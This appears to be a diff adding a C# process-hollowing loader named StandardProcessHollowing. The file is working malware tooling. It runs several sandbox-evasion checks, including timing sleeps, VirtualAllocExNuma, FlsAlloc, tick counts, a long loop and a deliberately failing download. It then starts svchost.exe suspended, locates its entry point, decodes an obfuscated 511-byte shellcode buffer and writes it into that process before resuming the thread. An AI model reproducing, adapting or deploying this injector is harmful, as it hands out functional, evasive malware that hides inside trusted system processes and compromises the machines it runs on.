@@ -1,0 +1,220 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.Threading;
+using System.Security.Cryptography;
+using System.Net;
+
+namespace StandardProcessHollowing
+{
+  public class SimpleAES
+  {
+      private AesCryptoServiceProvider _aes;
+      private ICryptoTransform _crypto;
+
+      public SimpleAES(string KEY, string IV)
+      {
+          _aes = new AesCryptoServiceProvider();
+          _aes.BlockSize = 128;
+          _aes.KeySize = 128;
+          _aes.Key = ASCIIEncoding.ASCII.GetBytes(KEY);
+          _aes.IV = ASCIIEncoding.ASCII.GetBytes(IV);
+          _aes.Padding = PaddingMode.PKCS7;
+          _aes.Mode = CipherMode.CBC;
+      }
+
+      public byte[] decrypt(string message)
+      {
+          _crypto = _aes.CreateDecryptor(_aes.Key, _aes.IV);
+          byte[] decrypted = _crypto.TransformFinalBlock(System.Convert.FromBase64String(message), 0, System.Convert.FromBase64String(message).Length);
+          _crypto.Dispose();
+          return decrypted;
+      }
+  }
+  public class Program
+  {
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+    struct STARTUPINFO
+    {
+      public Int32 cb;
+      public IntPtr lpReserved;
+      public IntPtr lpDesktop;
+      public IntPtr lpTitle;
+      public Int32 dwX;
+      public Int32 dwY;
+      public Int32 dwXSize;
+      public Int32 dwYSize;
+      public Int32 dwXCountChars;
+      public Int32 dwYCountChars;
+      public Int32 dwFillAttribute;
+      public Int32 dwFlags;
+      public Int16 wShowWindow;
+      public Int16 cbReserved2;
+      public IntPtr lpReserved2;
+      public IntPtr hStdInput;
+      public IntPtr hStdOutput;
+      public IntPtr hStdError;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+      public IntPtr hProcess;
+      public IntPtr hThread;
+      public int dwProcessId;
+      public int dwThreadId;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_BASIC_INFORMATION
+    {
+      public IntPtr Reserved1;
+      public IntPtr PebAddress;
+      public IntPtr Reserved2;
+      public IntPtr Reserved3;
+      public IntPtr UniquePid;
+      public IntPtr MoreReserved;
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("kernel32.dll")]
+    static extern void Sleep(uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr FlsAlloc(IntPtr callback);
+
+    [DllImport("kernel32.dll")]
+    static extern uint GetTickCount();
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentProcess();
+
+    //MAIN
+    static void Main(string[] args)
+    {
+      Console.WriteLine("[+] Validating Environment...");
+
+      DateTime t1 = DateTime.Now;
+      Sleep(2000);
+      double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+      if (t2 < 1.5)
+      {
+          Environment.Exit(0);
+      }
+      Console.WriteLine("\t|_Date Time: " + t2);
+
+      IntPtr VirtualAllocExNumaMem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+
+      if (VirtualAllocExNumaMem == null)
+      {
+          Environment.Exit(0);
+      }
+      Console.WriteLine("\t|_VirtualAllocExNumaMem: " + VirtualAllocExNumaMem);
+
+      IntPtr FlsAllocMem = FlsAlloc(IntPtr.Zero);
+      if (FlsAllocMem == null)
+      {
+          Environment.Exit(0);
+      }
+      Console.WriteLine("\t|_FlsAlloc: " + FlsAlloc(IntPtr.Zero));
+
+      if (GetTickCount() < 60000)
+      {
+          Environment.Exit(0);
+      }
+      Console.WriteLine("\t|_GetTickCount: " + GetTickCount());
+
+      int manyrun = 0;
+      for (int z = 0; z < 100000000; z++)
+      {
+          manyrun++;
+      }
+      Console.WriteLine("\t|_LoopCheck: " + manyrun);
+      if (manyrun == 100000000)
+      {
+              try
+              {
+                  var fakeKey = new WebClient().DownloadString("http://ioashndoiasnddhaposdmawpidnaspidmwneionioasndoiasndpspodmadmasaadhjpoadelnbjkbnsa=asdasnmdpasjdpasdnfnpfnouahd/key.txt");
+              }
+              catch(Exception e)
+              {
+                STARTUPINFO si = new STARTUPINFO();
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+                uint tmp = 0;
+                IntPtr hProcess = pi.hProcess;
+                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+                byte[] addrBuf = new byte[IntPtr.Size];
+                IntPtr nRead = IntPtr.Zero;
+                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                byte[] data = new byte[0x200];
+                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+                uint opthdr = e_lfanew_offset + 0x28;
+                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+                DateTime t3 = DateTime.Now;
+                Sleep(2000);
+                double t4 = DateTime.Now.Subtract(t3).TotalSeconds;
+                if (t4 < 1.5)
+                {
+                    Environment.Exit(0);
+                }
+
+                byte[] buf = new byte[511] {
+0x6b,0xf7,0xb2,0x93,0x9f,0x97,0x9b,0x0f,0x0f,0x0f,0x44,0xf4,0x44,0xff,0xfd,0xf4,0xe1,0xf7,0x54,0x7d,0xe8,0xf7,0xba,0xfd,0xef,0xf7,0xba,0xfd,0x27,0xf7,0xba,0xfd,0x2f,0xf7,0xba,0x1d,0xff,0xf7,0x5e,0xc6,0xf5,0xf5,0xf0,0x54,0x4c,0xf7,0x54,0x4f,0x7b,0x2b,0xe4,0xeb,0x0d,0xfb,0x2f,0x44,0xc4,0x4c,0x30,0x44,0x84,0xc4,0x6d,0x90,0xfd,0x44,0xf4,0xf7,0xba,0xfd,0x2f,0xba,0xcd,0x2b,0xf7,0x84,0x7f,0x11,0x04,0x07,0x27,0x3a,0x0d,0x5e,0x88,0x1d,0x0f,0x0f,0x0f,0xba,0x8f,0xb7,0x0f,0x0f,0x0f,0xf7,0x88,0x4f,0x03,0x16,0xf7,0x84,0x7f,0xff,0xba,0xf7,0x27,0xf3,0xba,0xcf,0x2f,0xcc,0x84,0x7f,0x92,0xe1,0xf7,0x6e,0x4c,0x44,0xba,0x43,0xb7,0xf7,0x84,0x61,0xf0,0x54,0x4c,0xf7,0x54,0x4f,0x7b,0x44,0xc4,0x4c,0x30,0x44,0x84,0xc4,0x47,0x6f,0x18,0x94,0x1b,0x32,0x1b,0x53,0x37,0xc8,0x5c,0x74,0x18,0x67,0xe7,0xf3,0xba,0xcf,0x53,0xcc,0x84,0x7f,0x11,0x44,0xba,0x5b,0xf7,0xf3,0xba,0xcf,0x8b,0xcc,0x84,0x7f,0x44,0xba,0x33,0xb7,0xf7,0x84,0x7f,0x44,0xe7,0x44,0xe7,0x49,0xfc,0xe5,0x44,0xe7,0x44,0xfc,0x44,0xe5,0xf7,0xb2,0x3b,0x2f,0x44,0xfd,0x6e,0x6f,0xe7,0x44,0xfc,0xe5,0xf7,0xba,0x3d,0x6c,0xfa,0x6e,0x6e,0x6e,0xe0,0xcc,0xa9,0x06,0x02,0x5d,0xce,0x42,0x5d,0x0f,0x0f,0x44,0xe1,0xcc,0x8c,0x91,0xf7,0x04,0x3b,0xaf,0x84,0x0f,0x0f,0xcc,0x8c,0x68,0xcc,0xab,0x0d,0x0f,0x0e,0xbf,0x4f,0xd7,0x54,0xf1,0x44,0xe3,0xcc,0x8c,0x93,0x1b,0x8c,0x94,0x44,0xc5,0x1b,0x06,0x51,0x36,0x6e,0x78,0x1b,0x8c,0x95,0x17,0x84,0x84,0x0f,0x0f,0xfc,0x44,0xc5,0x2c,0x8f,0x1a,0x0f,0x6e,0x78,0x15,0x35,0x44,0x49,0xff,0xff,0xf0,0x54,0x4c,0xf0,0x54,0x4f,0xf7,0x6e,0x4f,0xf7,0x8c,0x4d,0xf7,0x6e,0x4f,0xf7,0x8c,0xc4,0x44,0xc5,0x95,0x5e,0x4e,0x6f,0x6e,0x78,0xf7,0x8c,0x76,0x15,0x3f,0x44,0xe7,0x1b,0x8c,0x6d,0xf7,0x8c,0x9c,0x44,0xc5,0xbc,0xa8,0x03,0xe4,0x6e,0x78,0x88,0x4f,0x03,0x35,0xcc,0x6e,0x99,0x18,0x68,0x97,0xa2,0x0f,0x0f,0x0f,0xf7,0xb2,0x3b,0x3f,0xf7,0x8c,0x6d,0xf0,0x54,0x4c,0x15,0x33,0x44,0xe7,0xf7,0x8c,0x9c,0x44,0xc5,0x0d,0x7c,0x77,0xce,0x6e,0x78,0xb2,0x87,0x0f,0xe9,0xf8,0xf7,0xb2,0x73,0x2f,0x49,0x8c,0x81,0x15,0xcf,0x44,0xfc,0x17,0x0f,0x3f,0x0f,0x0f,0x44,0xe7,0xf7,0x8c,0x9d,0xf7,0x54,0x4c,0x44,0xc5,0xe7,0xd3,0xe2,0x68,0x6e,0x78,0xf7,0x8c,0x72,0xcc,0x8c,0x76,0xf0,0x54,0x4c,0xcc,0x8c,0x9f,0xf7,0x8c,0x65,0xf7,0x8c,0x9c,0x44,0xc5,0x0d,0x7c,0x77,0xce,0x6e,0x78,0xb2,0x87,0x0f,0x00,0x57,0xe7,0x44,0xe6,0xfc,0x17,0x0f,0xcf,0x0f,0x0f,0x44,0xe7,0x15,0x0f,0xe5,0x44,0xc5,0x3a,0xfe,0x5e,0x5f,0x6e,0x78,0xe6,0xfc,0x44,0xc5,0x18,0xb9,0xf0,0xe4,0x6e,0x78,0xcc,0x6e,0x99,0x6c,0x2b,0x6e,0x6e,0x6e,0xf7,0x84,0x72,0xf7,0x2c,0x71,0xf7,0x88,0x81,0x18,0xc3,0x44,0x6e,0x96,0xe7,0x15,0x0f,0xfc,0xca,0x6f,0x20,0x55,0x35,0x44,0x8c,0x65,0x6e,0x78 };
+
+for (int i = 0; i < buf.Length; i++)
+{	buf[i] = (byte)(((uint)buf[i] ^ 0xec) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] - 229) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] ^ 0xc2) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] + 125) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] ^ 0x6d) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] - 91) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] + 132) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] + 91) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] - 71) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] ^ 0x8a) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] ^ 0xf2) & 0xFF);
+	buf[i] = (byte)(((uint)buf[i] ^ 0x69) & 0xFF);
+}
+
+                WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+                ResumeThread(pi.hThread);
+
+                Console.WriteLine("Are you felling It now?");
+                Environment.Exit(0);
+              }
+              Environment.Exit(0);
+    }
+    Environment.Exit(0);
+  }
+}
+}
